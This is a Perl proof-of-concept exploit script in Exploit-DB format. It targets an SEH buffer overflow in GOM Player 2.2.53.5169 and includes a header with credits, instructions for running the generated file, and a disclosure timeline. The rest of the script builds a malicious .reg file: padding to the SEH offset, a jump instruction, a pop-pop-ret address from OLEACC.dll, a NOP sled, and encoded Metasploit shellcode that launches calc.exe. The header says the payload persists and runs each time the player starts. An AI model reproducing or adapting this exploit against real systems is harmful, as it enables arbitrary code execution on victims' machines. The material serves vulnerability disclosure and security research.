#!/usr/bin/perl

######################################################################################################
# Exploit Title: GOM Player 2.2.53.5169 - SEH Buffer Overflow (.reg)
# Date: 11-26-2013
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software/Version: GOM Player 2.2.53.5169
# Vendor Site: http://player.gomlab.com/eng/
# Vulnerable Software Link: http://www.oldapps.com/gom_player.php?old_gom_player=12874
# Tested On: Windows XP SP3 (Only crashes Win 7 b/c no suitable seh modules or jmp/call regs found)
# Details:
# -- GOM Player uses registry keys to set various attributes including the equalizer presets
# -- These registry values can be found here: HKEY_CURRENT_USER\Software\GRETECH\GomPlayer\OPTION
# -- It loads these values into memory without proper bounds checks which enables the exploit
# -- Modification of these registry values requires binary input (a line feed).  
# -- To accomplish this via the reg file I used 2 char hex values separated by a comma. 
# -- For example, instead of \x41\x41 it's 41,41.  This also has an added benefit of avoiding the 
# -- Unicode encoding that occurs if ascii input is used 
# To Exploit:
# -- 1) Run created .reg file and 2) Open GOM Player 
# -- Note: GOM Player must have been run at least once on the target machine before
# -- running the .reg file or the necessary registry entries will not exist
# -- Once the registry has been modified, this exploit will be persistent and execute every time
# -- GOM player is run
# Timeline:
# -- 27 Nov: Vuln discovered, vendor contacted; vuln acknowledged, fix planned for next release
# -- 28 Nov: Contacted Mitre for CVE coord; informed that despite past precedent (CVE 2013-6356), a 
# --         vuln that requires a user to open/run a file such as .reg should not be assigned a CVE
# -- 09 Dec: Vendor goes live w/ updated version containing fix; public disclosure
#######################################################################################################
# Exploit-DB Note:
# This PoC may need some adjustments
#

my $buffsize = 5000; # sets buffer size for consistent sized payload

# construct the required start and end of the reg file
my $regfilestart ="Windows Registry Editor Version 5.00\n\n";
$regfilestart = $regfilestart . "[HKEY_CURRENT_USER\\Software\\GRETECH\\GomPlayer\\OPTION]\n";
$regfilestart = $regfilestart . "\"_EQPRESET009\"="; # I used preset 9 arbitrarily; any eqpreset will cause a bof condition
my $regfileend = "0a," . "0,0,0,0,0,0"; # the line feed (0a) is required to trigger the exploit
					# the additional 0s represent dummy/placeholder equalizer settings

my $junk = "41," x 568; # offset to next seh at 568
my $nseh = "eb,14,90,90,"; # overwrite next seh with jmp instruction (8 bytes)
my $seh = "44,26,c8,74,"; # 0x74c82644 : pop ebx  pop ebp  ret 
			              # ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.2.5406.0 (C:\WINDOWS\system32\OLEACC.dll)
my $nops = "90," x 50; 

# Calc.exe payload [size 461]
# msfpayload windows/exec CMD=calc.exe R | 
# msfencode -e x86/alpha_mixed -c 1 -b '\x00\x0a\x0d\xff'
my $shell = "db,cd,d9,74,24,f4,5f,57,59,49,49,49,49,49," .
"49,49,49,49,43,43,43,43,43,43,43,37,51,5a," .
"6a,41,58,50,30,41,30,41,6b,41,41,51,32,41," .
"42,32,42,42,30,42,42,41,42,58,50,38,41,42," .
"75,4a,49,69,6c,6b,58,4f,79,55,50,75,50,35," .
"50,33,50,4b,39,49,75,66,51,4a,72,52,44,6e," .
"6b,70,52,44,70,6e,6b,42,72,44,4c,4c,4b,63," .
"62,64,54,6e,6b,42,52,54,68,34,4f,6c,77,63," .
"7a,35,76,65,61,4b,4f,74,71,4f,30,6c,6c,65," .
"6c,71,71,53,4c,46,62,76,4c,37,50,49,51,68," .
"4f,76,6d,57,71,6b,77,7a,42,7a,50,32,72,42," .
"77,4c,4b,42,72,44,50,6c,4b,31,52,37,4c,55," .
"51,7a,70,4c,4b,33,70,62,58,4f,75,6b,70,51," .
"64,52,6a,77,71,78,50,42,70,4c,4b,52,68,47," .
"68,4c,4b,46,38,37,50,77,71,5a,73,58,63,55," .
"6c,53,79,4e,6b,66,54,4c,4b,73,31,38,56,75," .
"61,59,6f,36,51,59,50,4c,6c,6a,61,4a,6f,34," .
"4d,46,61,79,57,77,48,49,70,31,65,4b,44,65," .
"53,43,4d,6b,48,65,6b,53,4d,64,64,53,45,6d," .
"32,73,68,6e,6b,70,58,67,54,67,71,39,43,62," .
"46,6c,4b,76,6c,42,6b,4e,6b,62,78,45,4c,37," .
"71,38,53,4c,4b,46,64,4c,4b,45,51,48,50,4c," .
"49,50,44,71,34,47,54,71,4b,31,4b,63,51,31," .
"49,63,6a,70,51,69,6f,39,70,46,38,73,6f,53," .
"6a,4e,6b,56,72,58,6b,4b,36,31,4d,42,4a,55," .
"51,4c,4d,4d,55,38,39,65,50,65,50,65,50,56," .
"30,62,48,75,61,4c,4b,62,4f,4f,77,79,6f,49," .
"45,6f,4b,5a,50,6c,75,4d,72,36,36,42,48,59," .
"36,4a,35,4d,6d,6d,4d,49,6f,49,45,45,6c,45," .
"56,43,4c,76,6a,4f,70,39,6b,4b,50,42,55,36," .
"65,4d,6b,51,57,44,53,62,52,50,6f,62,4a,77," .
"70,56,33,6b,4f,4a,75,35,33,35,31,72,4c,33," .
"53,74,6e,32,45,43,48,75,35,37,70,41,41,";
 
my $sploit = $junk.$nseh.$seh.$nops.$shell; # assemble the exploit portion of the buffer
my $fill = "43," x ($buffsize - (length($sploit))/3); # fill remainder of buffer with junk; divide by 3 to compensate for hex format
my $buffer = $sploit.$fill; # assemble the final buffer
my $regfile = $regfilestart . "hex: " . $buffer . $regfileend; # construct the reg file with hex payload to generate binary registry entry

# write the exploit buffer to file
my $file = "gom_seh_bof.reg";
open(FILE, ">$file");
print FILE $regfile;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer)/3 . "\n"; 